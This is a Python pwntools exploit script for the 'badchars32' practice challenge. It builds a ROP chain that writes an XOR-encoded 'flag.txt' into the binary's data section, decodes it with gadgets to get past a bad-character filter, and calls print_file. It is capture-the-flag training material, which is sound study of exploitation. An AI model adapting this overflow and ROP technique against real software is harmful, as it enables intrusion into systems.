from pwn import *

context.update(os='linux', arch='i386', log_level='debug')
io = process("./badchars32")

# gadgets
pop_ebx         = 0x804839d # pop ebx; ret;
pop_ebp         = 0x80485bb # pop ebp; ret;
xor_gadget      = 0x8048547 # xor byte ptr [ebp], bl; ret;
write_gadget    = 0x804854f # mov dword ptr [edi], esi; ret;
pop_esi_edi_ebp = 0x80485b9 # pop esi; pop edi; pop ebp; ret;

# write location
data_sec        = 0x804a018

# target function
print_file      = 0x80483d0


def xor_string(string: str, key: int) -> str:
    return ''.join(chr(ord(char) ^ key) for char in string)


def write_data(location: int, data: str) -> bytes:
    encoded_string = xor_string(string=data, key=0x51).encode()

    layout = b""
    layout += p32(pop_esi_edi_ebp)
    layout += encoded_string
    layout += p32(location)
    layout += p32(0)
    layout += p32(write_gadget)

    return layout


def restore_data(location: int, string: str, key: int) -> bytes:
    layout = b""

    for i in range(0, len(string)):
        layout += p32(pop_ebp)
        layout += p32(location + i)
        layout += p32(pop_ebx)
        layout += p32(key)
        layout += p32(xor_gadget)

    return layout


def gen_payload(size: int) -> bytes:
    string = "flag.txt"
    offset = cyclic_find("laaa", n=4)

    log.info(f"offset: {offset}")

    payload = b""
    payload += b"A" * offset

    # write encoded flag.txt
    payload += write_data(location=data_sec, data=string[:4])
    payload += write_data(location=data_sec+4, data=string[4:])

    # restore flag.txt
    payload += restore_data(location=data_sec, string=string, key=0x51)

    # flag.txt restored
    payload += p32(print_file)
    payload += p32(0)
    payload += p32(data_sec)

    return payload


io.sendlineafter(b"> ", gen_payload(size=80))
io.interactive()
